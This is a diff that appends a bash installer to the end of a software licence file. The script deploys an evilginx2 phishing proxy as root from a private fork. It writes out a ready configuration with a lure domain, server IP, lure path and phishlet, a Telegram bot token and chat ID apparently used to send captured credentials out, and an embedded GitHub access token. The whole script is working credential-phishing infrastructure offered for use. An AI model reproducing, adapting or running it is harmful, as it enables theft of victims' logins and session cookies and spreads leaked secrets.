@@ -25,3 +25,317 @@ DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+
+#!/bin/bash
+
+      # Colors for output
+      RED='\033[0;31m'
+      GREEN='\033[0;32m'
+      YELLOW='\033[1;33m'
+      NC='\033[0m' # No Color
+      
+      # Store the script path
+      SCRIPT_PATH=$(readlink -f "$0")
+      
+      # Function to print colored status messages
+      print_status() {
+          echo -e "${GREEN}[*]${NC} $1"
+      }
+      
+      print_error() {
+          echo -e "${RED}[!]${NC} $1"
+      }
+      
+      print_warning() {
+          echo -e "${YELLOW}[!]${NC} $1"
+      }
+      
+      
+      # Function to wait for command completion
+      wait_for_completion() {
+          local pid=$1
+          local message=$2
+          print_status "Waiting for $message..."
+          wait $pid
+          if [ $? -eq 0 ]; then
+              print_status "$message completed successfully"
+              return 0
+          else
+              print_error "$message failed"
+              return 1
+          fi
+      }
+      
+      # Check if script is run as root
+      if [ "$EUID" -ne 0 ]; then 
+          print_error "Please run as root"
+          exit 1
+      fi
+      
+      # Configuration variables
+      GITHUB_TOKEN="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"
+      REPO_URL="https://${GITHUB_TOKEN}@github.com/hossiney/evilginx2.git"
+      
+      
+      # Function to check and install dependencies
+      check_dependencies() {
+          print_status "Checking and installing dependencies..."
+          apt-get update > /dev/null 2>&1
+          
+          local deps=(git make golang wget curl gnupg ca-certificates software-properties-common screen)
+          for dep in "${deps[@]}"; do
+              if ! command -v "$dep" > /dev/null 2>&1; then
+                  print_status "Installing $dep..."
+                  apt-get install -y "$dep" > /dev/null 2>&1
+                  if [ $? -ne 0 ]; then
+                      print_error "Failed to install $dep"
+                      exit 1
+                  fi
+              fi
+          done
+          print_status "All dependencies installed successfully"
+      }
+
+      # Function to replace sitekey and secret key in project
+      replace_keys_in_project() {
+    echo "[+] Replacing sitekey and secret key in project files..."
+
+    # مسار المشروع بعد الكلون
+    PROJECT_DIR="/opt/evilginx2"
+
+    # لو المشروع مش موجود يبطل
+    if [ ! -d "$PROJECT_DIR" ]; then
+        echo "[!] Project directory not found: $PROJECT_DIR"
+        exit 1
+    fi
+
+    # استبدال secret key
+    # grep -rl '0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q' "$PROJECT_DIR" | while read -r file; do
+    #     sed -i 's|0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q|0x4AAAAAABm8jaLgeKeqeF6LpsAzSPcwjno|g' "$file"
+    #     echo "[*] Updated secret key in $file"
+    # done
+
+    # # استبدال sitekey
+    # grep -rl '0x4AAAAAABawvCmqhuyTQCB4' "$PROJECT_DIR" | while read -r file; do
+    #     sed -i 's|0x4AAAAAABawvCmqhuyTQCB4|0x4AAAAAABm8jfusWlQZBTvK|g' "$file"
+    #     echo "[*] Updated sitekey in $file"
+    # done
+
+    # echo "[+] Key replacement completed."
+}
+      # Function to install newer version of Go
+      install_go() {
+          print_status "Installing Go 1.24.4..."
+          # Remove existing Go installation
+          apt-get remove -y golang golang-go || true
+          rm -rf /usr/local/go
+      
+         # Download and install Go 1.22
+    wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz -O /tmp/go1.22.0.linux-amd64.tar.gz
+    tar -C /usr/local -xzf /tmp/go1.22.0.linux-amd64.tar.gz
+    rm /tmp/go1.22.0.linux-amd64.tar.gz
+          # Set up Go environment
+          export PATH=$PATH:/usr/local/go/bin
+          export GOPATH=/root/go
+          export GOROOT=/usr/local/go
+      }
+      
+      # Function to create config files
+      create_config_files() {
+          # Reset evilginx configuration directory
+          print_status "Resetting evilginx configuration directory..."
+          mkdir -p /root/.evilginx
+          chmod 700 /root/.evilginx
+ 
+          print_status "Removing old config.json…"
+          rm -f /root/.evilginx/config.json
+    
+          # Create config.json with dynamic configuration
+          print_status "Creating config.json..."
+          
+          # Write config.json using printf to avoid heredoc issues
+          printf '{
+        "blacklist": {
+          "mode": "off"
+        },
+        "general": {
+          "bind_ipv4": "",
+          "dns_port": 52,
+          "autocerts": false,
+          "domain": "testpage365.top",
+          "external_ipv4": "84.32.131.71",
+          "https_port": 443,
+          "ipv4": "",
+          "telegram_bot_token": "7999641919:AAGJ1hA7r4WgytHhGvwOlbAZ3giqxnM8K2A",
+          "telegram_chat_id": "6356209621",
+          "unauth_url": ""
+        },
+        "lures": [
+          {
+            "id": "0",
+            "hostname": "",
+            "path": "/WWB5CsadbeluLeHCaEiY2e8PF",
+            "redirect_url": "",
+            "phishlet": "go",
+            "redirector": "",
+            "ua_filter": "",
+            "info": "",
+            "og_title": "",
+            "og_desc": "",
+            "og_image": "",
+            "og_url": "",
+            "paused": 0
+          }
+        ],
+        "phishlets": {
+          "go": {
+            "hostname": "testpage365.top",
+            "unauth_url": "",
+            "enabled": true,
+            "visible": true
+          }
+        }
+      }' "$DOMAIN" "$EXTERNAL_IP" "$TELEGRAM_BOT" "$TELEGRAM_CHAT" "$UNAUTH_URL" "$LURE_PATH" "$REDIRECT_URL" "$PHISHLET_NAME" "$PHISHLET_NAME" "$DOMAIN"  > /root/.evilginx/config.json
+
+      
+
+      chmod 600 /root/.evilginx/config.json
+      print_status "config.json has been recreated successfully"
+      
+        # need to change site key and secret key in the project 
+
+          # Create basic configuration using printf
+          print_status "Creating basic configuration..."
+          
+          printf '{
+          "telegram": {
+              "bot_token": "%s",
+              "chat_id": "%s"
+          },
+          "auth": {
+              "userToken": "JEMEX_FISHER_2024"
+          },
+          "user_id": "%s"
+      }' "$TELEGRAM_BOT" "$TELEGRAM_CHAT" "$USER_ID" > /opt/evilginx2/userConfig.json
+      
+          chmod 600 /opt/evilginx2/userConfig.json
+      }
+      
+      # Function to install evilginx2
+      install_evilginx() {
+          # Check and install dependencies first
+          check_dependencies || exit 1
+          
+          # Install correct version of Go
+          install_go
+          
+          # Clone and build evilginx2
+          print_status "Cloning and building evilginx2..."
+          cd /opt
+          if [ -d "evilginx2" ]; then
+              print_status "Removing existing evilginx2 directory..."
+              rm -rf evilginx2
+          fi
+          
+          if ! git clone "${REPO_URL}"; then
+              print_error "Failed to clone repository"
+              exit 1
+          fi
+      # replace sitekey and secret key in the project
+         replace_keys_in_project || exit 1
+
+          cd evilginx2
+          print_status "Setting up Go environment..."
+          # Force Go to use modules
+          export GO111MODULE=on
+          export GOFLAGS="-mod=mod"
+          export PATH=/usr/local/go/bin:$PATH
+          export GOPATH=/root/go
+          export GOROOT=/usr/local/go
+          
+          # Create Go directories with proper permissions
+          mkdir -p /root/go/pkg/mod
+          chmod -R 755 /root/go
+          
+          print_status "Removing vendor directory..."
+          rm -rf vendor/
+          
+          print_status "Cleaning Go module cache..."
+          /usr/local/go/bin/go clean -modcache || {
+              print_warning "Standard cache clean failed, trying alternative method..."
+              rm -rf /root/go/pkg/mod/* 2>/dev/null || true
+              rm -rf $GOPATH/pkg/mod/* 2>/dev/null || true
+          }
+          
+          print_status "Updating Go dependencies..."
+          if ! /usr/local/go/bin/go mod edit -go=1.22; then
+              print_error "Failed to update Go version"
+              exit 1
+          fi
+          
+          if ! /usr/local/go/bin/go get -u ./...; then
+              print_error "Failed to get dependencies"
+              exit 1
+          fi
+          
+          if ! /usr/local/go/bin/go mod tidy; then
+              print_error "Failed to tidy modules"
+              exit 1
+          fi
+          
+          print_status "Building evilginx2..."
+          if ! CGO_ENABLED=0 /usr/local/go/bin/go build -o evilginx; then
+              print_error "Failed to build evilginx2"
+              exit 1
+          fi
+          
+          if [ ! -f "evilginx" ]; then
+              print_error "Build completed but binary not found"
+              exit 1
+          fi
+          
+          chmod +x evilginx
+          print_status "Build completed successfully"
+      
+          # Create necessary directories and files
+          print_status "Creating necessary directories and files..."
+          mkdir -p /opt/evilginx2/phishlets
+          mkdir -p /var/log
+          touch /var/log/evilginx2.log /var/log/evilginx2.error.log
+          chmod 644 /var/log/evilginx2.log /var/log/evilginx2.error.log
+      
+          # Create config files
+          create_config_files
+      
+          print_status "Installation completed successfully!"
+          print_status "Evilginx2 is ready for manual configuration"
+          print_status ""
+          print_status "Next steps:"
+          print_status "1. Start Evilginx2: cd /opt/evilginx2 && screen -dmS evilginx2 bash -c './evilginx -p /opt/evilginx2/phishlets'"
+          print_status "2. Attach to session: screen -r evilginx2"
+          print_status "3. Configure your phishlet and domain settings"
+          print_status "4. Detach from session: Press Ctrl+A then D"
+      
+          # Clean up token from script using absolute path
+          if [ -f "$SCRIPT_PATH" ]; then
+              sed -i "s/${GITHUB_TOKEN}/********/g" "$SCRIPT_PATH"
+          else
+              print_warning "Could not clean up GitHub token from script (script not found at $SCRIPT_PATH)"
+          fi
+      
+          return 0
+      }
+      
+      # Main execution
+      case "$1" in
+          "install")
+              install_evilginx
+              ;;
+          *)
+              echo "Usage: $0 install"
+              echo "This script only installs Evilginx2 without starting it"
+              echo "After installation, you need to manually start and configure Evilginx2"
+              exit 1
+              ;;
+      esac
